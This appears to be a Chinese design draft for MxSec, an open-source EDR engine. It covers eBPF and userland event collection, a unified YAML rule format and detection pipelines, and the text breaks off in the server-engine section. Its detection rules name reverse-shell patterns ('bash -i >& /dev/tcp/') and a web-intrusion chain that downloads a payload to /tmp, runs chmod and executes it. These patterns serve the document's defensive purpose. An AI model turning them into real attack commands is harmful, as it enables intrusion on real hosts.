# MxSec EDR 引擎架构设计方案

**版本**: v1.0-draft  
**日期**: 2026-05-15  
**状态**: 待评审

---

## 一、项目背景

### 1.1 平台简介

MxSec（矩阵云安全平台）是一个开源 CWPP（云工作负载保护平台），采用 Agent + Plugin + Server 三层架构，目标是打造**高集成度、规则开放、云原生友好的开源 CWPP/EDR**。

技术栈：Go 1.25+ / Gin / gRPC / MySQL / ClickHouse / Kafka / Redis / Vue3 + TypeScript

### 1.2 当前 EDR 现状

| 指标 | 当前值 | 问题 |
|------|--------|------|
| 事件采集 | 依赖 Tetragon 外部进程 | 外部依赖重，部署复杂，不可控 |
| 事件类型 | 进程/文件/网络 3 类 | 缺少 DNS、文件 rename/unlink/chmod |
| 检测引擎 | Server 端 CEL 表达式 | Agent 端无检测能力，无法实时阻断 |
| 内置规则 | 38 条 CEL 规则 | 仅覆盖 ~15 个 MITRE ATT&CK 技术点 (7.5%) |
| IOC 情报 | abuse.ch 数据已同步 Redis | 未接入检测流水线 |
| 进程树 | 无 | 每个事件孤立评估，无法检测攻击链 |
| 告警去重 | 仅端口扫描有冷却 | CEL 规则无去重，存在告警风暴风险 |
| YARA 联动 | 独立 Scanner 插件 | 无事件触发扫描能力 |
| 规则格式 | CEL 表达式（代码级） | 社区贡献门槛高 |
| 系统兼容 | 仅 eBPF 内核 (>= 5.4) | CentOS 7 等旧内核无法运行 |

### 1.3 设计目标

1. **自研引擎** — 去除 Tetragon 外部依赖，基于 cilium/ebpf 自研采集层
2. **独立规则库** — YAML 声明式规则，社区可贡献，agent/server/yara 三层联动
3. **双层检测** — Agent 端实时阻断 + Server 端深度分析
4. **全兼容** — eBPF (kernel >= 5.4) + 用户态降级 (CentOS 7)
5. **检测深度** — 四层检测模型，200+ 规则覆盖 60+ MITRE 技术点

---

## 二、整体架构

### 2.1 系统架构图

```
┌────────────────────────────────────────────────────────────────┐
│                     社区规则仓库 (Git)                          │
│  mxsec-rules/                                                  │
│  ├── rules/ (YAML 检测规则)                                    │
│  ├── yara/  (YARA 恶意特征规则)                                │
│  ├── ioc/   (IOC 威胁情报)                                     │
│  └── manifest.json (版本 + 校验和)                             │
└────────────────────────┬───────────────────────────────────────┘
                         │ 定时拉取 / API 同步
                         ▼
┌────────────────────────────────────────────────────────────────┐
│                        Server                                  │
│                                                                │
│  Manager                           Consumer                    │
│  ┌──────────────┐                  ┌─────────────────────────┐│
│  │ 规则/模型/情报│ ─ 合并下发 ──▶  │ 检测流水线 (11 层)       ││
│  │              │                  │                         ││
│  │ 社区规则同步  │                  │ L5  IOC+信誉碰撞        ││
│  │ ML 模型管理  │                  │ L6  进程树+故事线       ││
│  │ 多源情报聚合  │                  │ L7  CEL 规则引擎        ││
│  │ 文件信誉库   │                  │ L8  ML/BDE 行为检测     ││
│  │ Playbook 管理│                  │ L9  序列检测器          ││
│  │ 沙箱对接     │                  │ L10 告警聚合+故事线     ││
│  │              │                  │ L11 响应+Playbook       ││
│  └──────┬───────┘                  └─────────────────────────┘│
│         │                                                      │
│         │ gRPC: 规则/模型/情报推送 + Agent 心跳 + 远程取证      │
└─────────┼──────────────────────────────────────────────────────┘
          ▼
┌────────────────────────────────────────────────────────────────┐
│                  Agent (每台主机, 单进程架构)                    │
│                                                                │
│  核心引擎 (内置, 与 Agent 同进程):                              │
│  ┌──────────────┐ ┌──────────────┐ ┌────────────┐ ┌────────┐│
│  │ 事件采集层    │ │ 规则引擎      │ │ YARA 引擎  │ │ ML 推理 ││
│  │              │ │              │ │            │ │        ││
│  │ eBPF 模式    │ │ YAML 规则    │ │ yara-x     │ │ ONNX   ││
│  │ (>= 5.4)    │ │ 预编译匹配   │ │ 文件 + 内存 │ │ Runtime ││
│  │ 用户态模式   │ │ 实时阻断     │ │ 双模扫描   │ │ ELF 分类││
│  │ (CentOS 7)  │ │ enforce 模式 │ │            │ │        ││
│  └──────────────┘ └──────────────┘ └────────────┘ └────────┘│
│  ┌──────────────┐ ┌──────────────┐ ┌────────────┐ ┌────────┐│
│  │ BDE 采集器   │ │ 因果追踪器    │ │ WAL 缓冲   │ │ 远程取证││
│  │              │ │              │ │            │ │        ││
│  │ 4 维行为统计 │ │ CausalTracker│ │ 断网不丢   │ │ Shell  ││
│  │ 滑动窗口     │ │ story_id 传播│ │ 崩溃恢复   │ │ 文件获取││
│  └──────────────┘ └──────────────┘ └────────────┘ └────────┘│
│  ┌──────────────┐ ┌──────────────┐ ┌────────────────────────┐│
│  │ 网络隔离器   │ │ Watchdog     │ │ 文件信誉本地缓存        ││
│  │              │ │ (守护进程)   │ │ Bloom Filter + LRU     ││
│  │ eBPF/iptables│ │ 双进程互保   │ │ 信誉查询 < 1μs         ││
│  └──────────────┘ └──────────────┘ └────────────────────────┘│
│                                                                │
│  本地缓存: /var/lib/mxsec/ (rules/ wal/ models/ cache/)       │
│                                                                │
│  可选模块 (独立进程, 按需启动):                                 │
│  ┌──────────────────┐ ┌──────────────────┐                    │
│  │ Scanner Module    │ │ Baseline Module   │                    │
│  │ ClamAV + 完整YARA │ │ 基线合规检查       │                    │
│  │ 深度全盘扫描      │ │ CIS Benchmark     │                    │
│  └──────────────────┘ └──────────────────┘                    │
└────────────────────────────────────────────────────────────────┘

架构决策说明:
  为什么 EDR 不再是 Plugin:
  • 单进程 = 事件采集→检测→响应零 IPC 开销 (热路径无序列化)
  • 单进程 = 自保更简单 (只守护一个进程 + Watchdog)
  • 单进程 = eBPF 生命周期与 Agent 一致 (不会因 Plugin 崩溃卸载)
  • 单进程 = 统一资源管理 (一个 CPU/内存预算)
  • 商业标杆: CrowdStrike/SentinelOne/青藤万相均为单 Agent 架构

  为什么 Scanner/Baseline 保留为独立模块:
  • 全盘扫描/基线检查是重型 IO 操作，不应影响 EDR 实时检测
  • 按需启动，不在时不占资源
  • 崩溃不影响 EDR 核心功能
  • 通过 Unix Socket 与 Agent 通信 (非热路径，IPC 可接受)
```

### 2.2 事件流水线

```
事件产生到告警的完整链路:

  内核事件
     │
     ▼
  ┌─────────────────────── Agent 端 ───────────────────────┐
  │                                                         │
  │  Layer 0: eBPF 内核态过滤                                │
  │  • BPF Map 白名单（pid/comm）丢弃已知安全进程             │
  │  • 预估丢弃 ~60% 噪声                                   │
  │           ↓ ~800 EPS                                    │
  │  Layer 1: 用户态预过滤                                   │
  │  • 白名单路径/进程快速跳过                                │
  │  • 短连接去重（同 IP:Port 5s 内不重复上报）               │
  │           ↓ ~400 EPS                                    │
  │  Layer 2: 轻量规则匹配                                   │
  │  • event_type 索引 → 只评估相关规则                      │
  │  • 条件短路 + 正则预编译                                  │
  │  • 命中 → 执行动作（kill/alert）+ 标记上报                │
  │           ↓ 全量上报（含命中标记）                        │
  │  Layer 3: YARA 事件触发（可选）                           │
  │  • process_exec 时扫描 exe_path                          │
  │  • file_write 时扫描新文件                               │
  │  • 仅加载高优先级规则集                                   │
  │           ↓                                             │
  │  Layer 4: Protobuf 编码 → WAL 持久化 → Kafka             │
  │                                                         │
  └─────────────────────────────────────────────────────────┘
     │
     ▼ Kafka
  ┌─────────────────────── Server 端 ──────────────────────┐
  │                                                         │
  │  Layer 5: IOC + 文件信誉碰撞                              │
  │  • 多源 IOC 碰撞: remote_addr/exe_hash/dns_query         │
  │  • 文件信誉查询: hash → known_good/unknown/suspicious/bad│
  │  • 信誉评分注入: ioc_hit/ioc_score/file_reputation       │
  │           ↓                                             │
  │  Layer 6: 进程树 + 故事线注入                            │
  │  • 内存进程树查找父链（最多 8 层）                        │
  │  • 注入 parent_chain / ancestor_exe / tree_depth         │
  │  • story_id 关联 + 攻击阶段标记                         │
  │           ↓                                             │
  │  Layer 7: CEL 规则引擎                                  │
  │  • 编译后 Program 缓存评估                               │
  │  • DataType 预过滤 + 规则分组并行评估                    │
  │  • 支持聚合函数 + IOC 函数 + 进程树函数                  │
  │           ↓                                             │
  │  Layer 8: ML 行为检测                                   │
  │  • BDE 行为偏差计算 (4 维统计 + 跨主机基线)             │
  │  • Server 端 ML 模型推理 (Isolation Forest 异常检测)    │
  │  • risk_score 评估 + 异常事件标记                        │
  │           ↓                                             │
  │  Layer 9: 序列检测器                                    │
  │  • 滑动窗口 + 状态机                                    │
  │  • Redis 持久化中间状态                                  │
  │  • 多步攻击链完整匹配后触发告警                          │
  │           ↓                                             │
  │  Layer 10: 告警聚合 + 故事线评分                         │
  │  • 相同 (host_id, rule_id) 窗口内合并                    │
  │  • 故事线 story_score 更新 + 阶段推进                    │
  │  • 多阶段故事线 (>= 3) 自动升级                          │
  │           ↓                                             │
  │  Layer 11: 自动响应 + Playbook 编排                      │
  │  • 默认模式: 所有规则命中 → alert + suggest (建议动作)   │
  │  • enforce 模式: 管理员显式开启后 → 执行 kill/隔离/封堵  │
  │  • Playbook 触发: 匹配规则标签 → 执行编排流程            │
  │  • 熔断器保护 + 可疑文件自动提交沙箱                     │
  │                                                         │
  └─────────────────────────────────────────────────────────┘
```

---

## 三、事件采集层

### 3.1 双模采集架构

| 维度 | eBPF 模式 (kernel >= 5.4) | 用户态模式 (CentOS 7 / kernel < 5.4) |
|------|--------------------------|--------------------------------------|
| 进程事件 | tracepoint/sched_process_exec + sched_process_exit | cn_proc (netlink PROC_EVENT) |
| 文件事件 | fentry/kprobe security_file_open, security_inode_* (见 3.3 Hook 优先级) | fanotify (FAN_OPEN_PERM, FAN_CLOSE_WRITE) |
| 网络事件 | fentry/kprobe tcp_connect, inet_csk_accept, udp_sendmsg (见 3.3 Hook 优先级) | /proc/net/tcp + /proc/net/udp 轮询 (5s 间隔) |
| DNS 事件 | fentry/kprobe udp_sendmsg (dst_port=53) 解析 DNS payload | 解析 /var/log/dnsmasq 或 hook getaddrinfo (LD_PRELOAD) |
| 实现库 | cilium/ebpf (纯 Go, BPF CO-RE) | 标准库 + syscall |
| 内核字段 | 完整 (pid/ppid/uid/gid/exe/cmdline/cwd/env/tty) | 有限 (pid/ppid/exe/cmdline, 从 /proc 补充) |
| 性能开销 | < 2% CPU | < 5% CPU (轮询开销) |
| 实时性 | 实时 (内核回调) | 进程/文件实时, 网络准实时 (5s 延迟) |
| 文件操作 | open/read/write/rename/unlink/chmod | open/close_write (fanotify 限制) |

#### 能力等级声明

```
eBPF 模式 = 完整能力 (Full Mode)
  ✓ 进程/文件/网络/DNS 全事件类型
  ✓ 实时内核回调，零延迟
  ✓ 完整内核字段 (pid/ppid/uid/gid/exe/cmdline/cwd/env/tty/container)
  ✓ 文件全操作 (open/read/write/rename/unlink/chmod)
  ✓ 内核态白名单过滤 (BPF Map)
  ✓ 容器上下文自动注入
  要求: kernel >= 5.4, root 权限

用户态模式 = 基础能力 (Basic Mode)
  ✓ 进程事件: 实时 (cn_proc netlink)
  ✓ 文件事件: 实时但仅 open/close_write (fanotify 限制)
  △ 网络事件: 准实时, 5s 轮询延迟 (/proc/net)
  ✗ DNS 事件: 依赖日志解析或 LD_PRELOAD hook，覆盖不完整
  ✗ 容器上下文: 需从 /proc 补充，可能缺失
  △ 字段完整性: pid/ppid/exe/cmdline 可用，cwd/env/tty 需额外 /proc 读取
  适用: CentOS 7 / kernel < 5.4 等低内核版本兼容场景

部署建议:
  • 生产环境优先 eBPF 模式，用户态模式作为兜底
  • 用户态模式下，部分高级检测规则 (DNS tunnel / 容器逃逸) 自动禁用
  • Agent 启动时自动探测内核版本，选择最优模式并上报 Server
  • 管理后台按采集模式分组展示主机，标注能力差异
```

### 3.2 事件类型完整定义

```
当前事件 (3 类):
  DataType 3000: process_exec / process_exit
  DataType 3001: file_open / file_read / file_write
  DataType 3002: tcp_connect / tcp_accept / tcp_close / udp_send / icmp_recv

新增事件:
  DataType 3001: file_rename / file_unlink / file_chmod  (扩展)
  DataType 3003: dns_query  (新增)

进程事件字段扩展:
  现有: pid, ppid, exe, cmdline, parent_exe, uid, gid
  新增: start_time, cwd, tty, env (LD_PRELOAD/HTTP_PROXY 等关键变量)
        container_id, container_name (容器上下文)

网络事件字段扩展:
  现有: remote_addr, remote_port, local_addr, local_port, protocol
  新增: bytes_sent, bytes_recv, direction (inbound/outbound)

DNS 事件字段:
  query_name, query_type, response_code, response_ip, latency_ms
```

### 3.3 eBPF 实现方案

```
技术选型: cilium/ebpf + bpf2go

构建流程:
  BPF C 源码 (probes/*.c)
     │ bpf2go 编译
     ▼
  Go embed 文件 (*_bpfel.go / *_bpfeb.go)
     │ go build
     ▼
  单二进制 EDR 引擎 (无外部依赖)

BPF 程序结构:
  bpf/
  ├── process.c        # sched_process_exec/exit tracepoint
  ├── file.c           # security_file_open, security_inode_* fentry/kprobe
  ├── network.c        # tcp_connect, inet_csk_accept, udp_sendmsg fentry/kprobe
  ├── dns.c            # udp_sendmsg + DNS payload 解析
  ├── maps.h           # 共享 BPF Map 定义
  │   ├── whitelist_map    # PID/comm 白名单 (LRU_HASH)
  │   ├── event_ringbuf    # 事件输出 (RINGBUF, kernel >= 5.8; 降级 PERF_EVENT_ARRAY)
  │   └── config_map       # 运行时配置 (采样率/开关)
  └── common.h         # 公共结构体 (event_t)

Hook 优先级策略 (运行时自动探测):
  ┌─────────────────────────────────────────────────────────┐
  │ 启动时按优先级依次尝试，选择当前内核支持的最优方式:     │
  │                                                         │
  │ 优先级 1: fentry/fexit (kernel >= 5.5) [Phase 1 默认]  │
  │   • BPF trampoline 直接 patch 函数入口 JMP              │
  │   • 比 kprobe 低 5~10 倍开销，无断点+单步执行           │
  │   • cilium/ebpf 原生支持，无额外代码                    │
  │   • 注意: 部分内联函数不支持 fentry，需运行时检测       │
  │                                                         │
  │ 优先级 2: kprobe (kernel >= 5.4, 通用 fallback)         │
  │   • int3 断点陷阱 → handler → 单步恢复                  │
  │   • 开销较高，但兼容性最好                              │
  │   • 已有 BPF Map 白名单过滤，handler 内对白名单进程     │
  │     直接 return 0，实际开销可控                         │
  │                                                         │
  │ 优先级 3: BPF LSM (kernel >= 5.7) [Phase 2+ 增强]      │
  │   • 最优雅的 LSM hook 方式，直接挂载到 security_* 函数 │
  │   • 零 breakpoint 开销，可原生读取函数参数              │
  │   • 需要内核编译时启用 CONFIG_BPF_LSM (生产环境不一定开)│
  │   • 非 Phase 1 目标，作为增强能力按需启用               │
  │                                                         │
  │ 探测方式: cilium/ebpf 的 HaveProgramType() +            │
  │          尝试 attach → 失败则降级到下一优先级            │
  │ 记录: 启动日志 + Heartbeat 上报实际使用的 hook 类型     │
  └─────────────────────────────────────────────────────────┘

  高频路径特殊处理 (security_file_open):
  • 该函数在每次 open() 调用时触发，繁忙服务器可达数万次/秒
  • BPF 程序内第一行即 whitelist_map lookup，白名单进程直接 return
  • 对非白名单进程，检查 flags 过滤只读 open (O_RDONLY)，仅关注写操作
  • 两层过滤后实际需要处理的事件 < 5%

竞品对比:
  Elkeid:  自研 LKM 内核模块 + eBPF driver (C)，性能最优但维护成本极高
  Wazuh:   auditd 用户态，零内核代码但能力有限
  青藤:    纯用户态，兼容性最好但深度不足
  MxSec:   cilium/ebpf 纯 Go 方案，fentry 优先 + kprobe 兜底，平衡性能和维护成本
```

---

## 四、规则库架构

### 4.1 规则分发模型

```
三层分发:

  ┌─────────────────────────────────────────────────┐
  │  Layer 1: 内置默认规则                           │
  │  • 编译时 embed.FS 内嵌到 Server 二进制          │
  │  • 保证离线环境可用                              │
  │  • 随版本发布更新                                │
  │  • 预计 50~100 条核心规则                        │
  └──────────────────────┬──────────────────────────┘
                         │ 合并
  ┌──────────────────────┴──────────────────────────┐
  │  Layer 2: 社区规则仓库                           │
  │  • 独立 Git 仓库 (mxsec-rules)                  │
  │  • 社区通过 PR 贡献规则                          │
  │  • Server 定时拉取 (可配置间隔)                  │
  │  • 版本号 + SHA256 校验                          │
  │  • 管理员可选择性启用/禁用                       │
  └──────────────────────┬──────────────────────────┘
                         │ 下发
  ┌──────────────────────┴──────────────────────────┐
  │  Layer 3: Agent 端规则缓存                       │
  │  • Heartbeat 上报当前规则版本                    │
  │  • Server 对比后推送增量更新                     │
  │  • 本地缓存: /var/lib/mxsec/rules/              │
  │  • 热加载: 收到新规则后无需重启插件              │
  └─────────────────────────────────────────────────┘

更新流程:
  1. Server 启动 → 加载 embed 内置规则
  2. 定时同步 → 从社区仓库拉取，按 manifest.json 版本去重合并
  3. Agent Heartbeat → 上报 rules_version
  4. Server 对比 → 版本不一致时推送增量（新增/修改/删除的规则 ID 列表 + 规则内容）
  5. Agent 接收 → 写入本地缓存 + 热加载规则引擎
```

### 4.2 统一规则格式 (YAML)

一个规则文件同时描述 agent 端快速匹配、server 端深度分析、YARA 联动三层行为：

```yaml
# 规则示例: 反弹 Shell 检测
id: MXEDR-0001
name: reverse_shell_bash_dev_tcp
version: 2
category: process
severity: critical

mitre:
  tactic: execution
  technique: T1059.004
  
tags: [reverse_shell, post_exploitation, linux]

# ═══════════════════════════════════════════════
# Agent 端: 轻量匹配，支持实时阻断
# ═══════════════════════════════════════════════
agent:
  enabled: true
  action: alert                 # alert (默认) | kill | quarantine | block_ip
  enforce: false                # true = 执行 action; false = 仅 alert + suggest
  match:
    event_type: process_exec
    conditions:
      - field: cmdline
        op: regex
        value: "bash\\s+-i\\s+>&\\s+/dev/tcp/"
      - field: cmdline
        op: contains
        value: "0>&1"
    logic: and                  # and | or

# ═══════════════════════════════════════════════
# Server 端: CEL 深度分析（可选，用于复杂逻辑）
# ═══════════════════════════════════════════════
server:
  enabled: true
  cel: >
    event_type == "process_exec" &&
    cmdline.matches("bash\\s+-i\\s+>&\\s+/dev/tcp/") &&
    parent_exe != "/usr/sbin/sshd" &&
    !ancestor_has("ansible") &&
    !ancestor_has("puppet")

# ═══════════════════════════════════════════════
# YARA 联动（可选）: 规则命中时触发 YARA 扫描
# ═══════════════════════════════════════════════
yara:
  trigger: true
  scan_target: exe_path         # exe_path | cwd | parent_exe
  rule_tags: [malware, backdoor]

# ═══════════════════════════════════════════════
# 元信息
# ═══════════════════════════════════════════════
metadata:
  author: mxsec-team
  created: 2024-01-15
  updated: 2024-06-10
  description: "检测通过 bash -i >& /dev/tcp/ 方式建立的反弹 Shell"
  references:
    - https://attack.mitre.org/techniques/T1059/004/
  false_positive:
    - "合法的远程管理脚本（应加入白名单）"
  confidence: 95                # 0-100 置信度
```

### 4.3 支持的规则操作符

| 操作符 | 说明 | Agent 端 | Server 端 |
|--------|------|----------|-----------|
| `equals` | 精确匹配 | 支持 | CEL `==` |
| `not_equals` | 不等于 | 支持 | CEL `!=` |
| `contains` | 子串包含 | 支持 | CEL `.contains()` |
| `starts_with` | 前缀匹配 | 支持 | CEL `.startsWith()` |
| `ends_with` | 后缀匹配 | 支持 | CEL `.endsWith()` |
| `regex` | 正则匹配 | 支持 (预编译) | CEL `.matches()` |
| `in` | 值在列表中 | 支持 | CEL `in` |
| `gt` / `lt` | 数值比较 | 支持 | CEL `>` / `<` |
| `ioc_match` | IOC 碰撞 | 不支持 | CEL 自定义函数 |
| `count_recent` | 频率统计 | 不支持 | CEL 自定义函数 |
| `ancestor_has` | 进程树查找 | 不支持 | CEL 自定义函数 |
| `first_seen` | 首见检测 | 不支持 | CEL 自定义函数 |
| `is_private_ip` | 内网判断 | 不支持 | CEL 自定义函数 |

### 4.4 序列规则格式

```yaml
# 多步攻击链检测: Web 入侵 → 下载 → 执行
id: MXSEQ-0001
name: web_intrusion_download_execute
type: sequence
severity: critical
window: 300s                    # 5 分钟内完成全部步骤

mitre:
  tactic: execution
  technique: T1059

steps:
  - name: web_shell_spawn
    order: 1
    expression: >
      event_type == "process_exec" &&
      (ancestor_has("nginx") || ancestor_has("apache") || ancestor_has("java")) &&
      (exe.contains("bash") || exe.contains("sh"))

  - name: download_payload
    order: 2
    expression: >
      event_type == "process_exec" &&
      (exe.contains("wget") || exe.contains("curl")) &&
      (cmdline.contains("/tmp/") || cmdline.contains("/dev/shm/"))

  - name: make_executable
    order: 3
    expression: >
      event_type == "file_chmod" &&
      (file_path.startsWith("/tmp/") || file_path.startsWith("/dev/shm/"))

  - name: execute_payload
    order: 4
    expression: >
      event_type == "process_exec" &&
      (exe.startsWith("/tmp/") || exe.startsWith("/dev/shm/"))

metadata:
  author: mxsec-team
  description: "检测从 Web 服务器入侵到下载执行 payload 的完整攻击链"
  confidence: 98
```

### 4.5 竞品规则格式对比

| 维度 | MxSec YAML | Elkeid HUB | Wazuh XML | Sigma YAML | Falco YAML |
|------|-----------|------------|-----------|------------|------------|
| 格式 | YAML | Go 代码 | XML | YAML | YAML |
| Agent 端规则 | 内置支持 | Go 编译插件 | 不支持 | 不支持 | 内置支持 |
| Server 端规则 | CEL 表达式 | Go 编译 | XML 解码器 | 需转换 | 不支持 |
| YARA 联动 | 同文件声明 | 独立插件 | 独立模块 | 不支持 | 不支持 |
| 多步序列 | 同格式支持 | 不支持 | 不支持 | 不支持 | 不支持 |
| 社区贡献门槛 | 低 (写 YAML) | 高 (写 Go 代码 + 编译) | 中 (写 XML) | 低 (写 YAML) | 低 (写 YAML) |
| 热加载 | 支持 | 需重编译插件 | 需重启 | N/A | 支持 |
| 动作支持 | kill/quarantine/block | kill/quarantine | alert only | alert only | kill/alert |
| IOC 查询 | CEL 函数 | Go 代码 | CDB lookup | 不支持 | 不支持 |
| 进程树查询 | CEL 函数 | Go 代码 | 不支持 | 不支持 | 有限支持 |

**MxSec 独特优势**: 在同一个 YAML 文件中统一定义 agent 端阻断规则 + server 端深度分析 + YARA 联动 + 多步序列检测，这是目前所有竞品都不具备的。

### 4.6 规则测试框架 (Rule Lab)

```
规则质量保障分为两层:

Layer 1: 本地 CLI 测试工具 (mxsec-rule-test)
  ┌──────────────────────────────────────────────────────┐
  │  输入:                                                │
  │    • YAML 规则文件 (单条或目录)                       │
  │    • JSON 事件样本 (正样本 + 负样本)                  │
  │                                                      │
  │  处理:                                                │
  │    1. JSON Schema 验证规则格式                        │
  │    2. 正则表达式编译检查 (提前发现 ReDoS)             │
  │    3. Agent 端匹配引擎模拟评估                       │
  │    4. Server 端 CEL 表达式编译 + 评估                │
  │    5. 序列规则步骤一致性检查                          │
  │                                                      │
  │  输出:                                                │
  │    • PASS / FAIL 结果 + 命中详情                     │
  │    • 性能报告 (eval_time_us, regex_complexity)        │
  │    • 覆盖度报告 (命中了哪些 MITRE 技术点)            │
  └──────────────────────────────────────────────────────┘

  使用方式:
    $ mxsec-rule-test -rule rules/L1-static/process/T1059*.yml \
                      -events testdata/reverse_shell_samples.json
    ✓ T1059.004-reverse-shell-bash.yml  PASS  (3/3 正样本命中, 2/2 负样本跳过)
    ✗ T1059-reverse-shell-python.yml    FAIL  (负样本 legitimate_script.json 误命中)

  规则仓库内置测试数据:
    mxsec-rules/
    └── testdata/
        ├── process_exec/
        │   ├── reverse_shell_positive.json    # 各种反弹 Shell 事件样本
        │   ├── reverse_shell_negative.json    # 合法脚本事件样本
        │   └── crypto_miner_positive.json
        ├── file_write/
        │   ├── webshell_positive.json
        │   └── webshell_negative.json
        └── sequences/
            └── web_intrusion_chain.json       # 多步事件序列样本

Layer 2: CI/CD 自动化验证 (GitHub Actions)
  ┌──────────────────────────────────────────────────────┐
  │  触发条件: 社区 PR 提交新规则或修改规则               │
  │                                                      │
  │  Pipeline:                                           │
  │    1. 格式检查 — JSON Schema 验证                    │
  │    2. 编译检查 — 正则/CEL 是否可编译                  │
  │    3. 样本测试 — 正/负样本 replay 验证命中率          │
  │    4. 性能检查 — 单规则 eval < 100μs                 │
  │    5. 冲突检查 — 与现有规则 ID/名称是否冲突           │
  │    6. 多内核验证 (可选) — 在 kernel 4.15/5.4/5.15/6.1│
  │       容器中重放 eBPF 事件，验证字段可用性            │
  │                                                      │
  │  合并条件:                                            │
  │    • 全部 check 通过                                  │
  │    • 至少 1 名维护者 approve                         │
  │    • 规则 confidence >= 70                            │
  └──────────────────────────────────────────────────────┘
```

---

## 五、核心引擎设计

### 5.1 Agent 端引擎

```
┌──────────────────────────────────────────────────────────┐
│              Agent 核心 EDR 引擎 (内置模块)                │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ 规则管理器 (RuleManager)                            │  │
│  │                                                     │  │
│  │ • 从本地缓存加载 YAML 规则                          │  │
│  │ • 按 event_type 建立 HashMap 索引                   │  │
│  │ • 正则表达式预编译 (regexp.Compile)                  │  │
│  │ • 热加载: 文件变更或 Server 推送时自动重载           │  │
│  │ • 版本管理: 记录当前规则集版本号                     │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ 匹配引擎 (MatchEngine)                              │  │
│  │                                                     │  │
│  │ 评估流程:                                           │  │
│  │ 1. event_type 索引 → 获取候选规则组                 │  │
│  │ 2. 白名单 Bloom Filter 快速跳过已知安全进程         │  │
│  │ 3. 逐条评估:                                       │  │
│  │    - AND: 条件从左到右求值，第一个 false 短路跳出   │  │
│  │    - OR: 第一个 true 短路跳出                       │  │
│  │ 4. 命中 → 执行动作 + 标记事件                       │  │
│  │                                                     │  │
│  │ 性能指标:                                           │  │
│  │ • 单事件评估: < 50μs (100 条规则)                   │  │
│  │ • 正则匹配: < 10μs (预编译)                         │  │
│  │ • Bloom 查询: < 1μs                                │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ 响应执行器 (ActionExecutor)                         │  │
│  │                                                     │  │
│  │ • kill: syscall.Kill(pid, SIGKILL)                  │  │
│  │ • quarantine: 移动文件到隔离目录 + 去除执行权限     │  │
│  │ • alert: 仅标记上报，不执行本地动作                 │  │
│  │ • block_ip: iptables -A INPUT -s {ip} -j DROP       │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ YARA 扫描器 (YARAScanner)                           │  │
│  │                                                     │  │
│  │ • 内嵌 yara-x Go binding                            │  │
│  │ • 仅加载高优先级规则集 (malware/webshell/miner)     │  │
│  │ • 事件触发: process_exec → 扫描 exe_path            │  │
│  │            file_write → 扫描新文件                  │  │
│  │ • 与 Scanner Plugin 共享 YARA 规则源                │  │
│  │                                                     │  │
│  │ 扫描模式 (两种):                                    │  │
│  │                                                     │  │
│  │ async (默认):                                       │  │
│  │   • 进程正常执行，不阻塞                            │  │
│  │   • 后台 goroutine 异步扫描 exe_path / 新文件       │  │
│  │   • 发现恶意 → kill 进程 + 隔离文件 + 生成告警     │  │
│  │   • 扫描延迟: < 500ms (不影响进程启动)             │  │
│  │   • 适用: 99% 的场景                                │  │
│  │   • 风险: 进程在扫描完成前已执行，极端情况下        │  │
│  │     恶意操作可能在 kill 前部分完成                   │  │
│  │                                                     │  │
│  │ pre-block (需规则显式标记 yara.blocking: true):     │  │
│  │   • SIGSTOP 挂起进程 → 扫描 → 安全则 SIGCONT 放行  │  │
│  │                        → 恶意则 SIGKILL 终止        │  │
│  │   • 扫描超时 500ms → 强制 SIGCONT 放行 + 告警      │  │
│  │   • 适用: 已知高危场景 (勒索软件/Rootkit)           │  │
│  │   • 需管理员显式启用，默认不开启                    │  │
│  │   • 仅对 process_exec 生效，file_write 始终 async   │  │
│  │                                                     │  │
│  │ 规则 YAML 中的 blocking 标记:                       │  │
│  │   yara:                                             │  │
│  │     trigger: true                                   │  │
│  │     blocking: true  # 启用 pre-block 同步扫描       │  │
│  │     scan_target: exe_path                           │  │
│  │     rule_tags: [ransomware, rootkit]                │  │
│  └────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────┘
```

### 5.2 Server 端引擎

```
┌──────────────────────────────────────────────────────────┐
│                  Server Consumer 引擎                     │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ IOC 碰撞器 (IOCMatcher)                             │  │
│  │                                                     │  │
│  │ 数据源: abuse.ch (Feodo/URLhaus/MalwareBazaar)      │  │
│  │ 存储: Redis SET                                     │  │
│  │ 匹配字段:                                           │  │
│  │   • remote_addr → ioc:ip SET                       │  │
│  │   • exe_hash    → ioc:hash SET                     │  │
│  │   • dns_query   → ioc:domain SET                   │  │
│  │ 注入字段: ioc_hit, ioc_type, ioc_source, ioc_tags  │  │
│  │ 性能: Redis SISMEMBER O(1), < 1ms                  │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ 进程树引擎 (ProcessTree)                            │  │
│  │                                                     │  │
│  │ 数据结构:                                           │  │
│  │   map[hostID]map[pid]*ProcessNode                   │  │
│  │   ProcessNode: PID, PPID, Exe, Cmdline, UID,       │  │
│  │                StartTime, ContainerID, Children     │  │
│  │                                                     │  │
│  │ 维护方式:                                           │  │
│  │   process_exec → 添加节点 + 关联父节点              │  │
│  │   process_exit → 标记退出时间 (延迟清理)            │  │
│  │   TTL: 2 小时自动清理                               │  │
│  │                                                     │  │
│  │ 初始化与防断链:                                     │  │
│  │   1. /proc 初始快照 (Agent 启动时)                  │  │
│  │      • 遍历 /proc/[pid]/stat + cmdline + exe        │  │
│  │      • 构建当前所有进程的完整树结构                 │  │
│  │      • 作为 proc_snapshot 事件批量上报 Server        │  │
│  │      • 耗时: ~10ms (500 进程), 仅启动时执行一次     │  │
│  │   2. 定时对账 (每 5 分钟)                           │  │
│  │      • Agent 扫描 /proc 获取存活进程 PID 列表       │  │
│  │      • 与本地缓存 diff:                             │  │
│  │        - 本地有但 /proc 无 → 补发 process_exit      │  │
│  │        - /proc 有但本地无 → 补发 process_exec       │  │
│  │      • 解决网络抖动/Kafka 积压导致的 exit 事件丢失  │  │
│  │   3. 孤儿节点处理                                   │  │
│  │      • 父节点未知时标记 parent_known=false           │  │
│  │      • ancestor_has() 对未知祖先返回 unknown        │  │
│  │        (而非 false，避免漏报)                        │  │
│  │      • 规则可通过 tree_complete 字段判断树完整性     │  │
│  │                                                     │  │
│  │ 注入字段:                                           │  │
│  │   parent_exe, parent_cmdline                        │  │
